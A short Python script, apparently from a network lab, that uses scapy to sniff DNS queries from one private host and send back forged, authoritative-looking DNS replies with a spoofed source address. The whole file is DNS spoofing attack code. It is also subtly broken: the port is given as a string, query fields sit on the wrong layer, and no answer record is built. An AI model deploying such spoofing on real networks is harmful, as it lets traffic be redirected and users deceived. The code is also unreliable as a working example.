#!/usr/bin/env python3

from ntpath import join
from socket import timeout
from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP
from scapy.layers.dns import *
import sys


packet_filt = " and ".join([
#"udp dst port 53", # dns port filtering
"udp[10] & 0x80 = 0", # dns only
"src host 192.168.59.3"]) # ip source	


def dns_reply(packet): 
	print("sending packet")
	send(IP(dst="192.168.59.5", src="192.168.59.3")/UDP(dport="53", sport="53")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))

print("started sniffing")
sniff(filter = packet_filt,prn = dns_reply, store=0, iface="enp0s10")




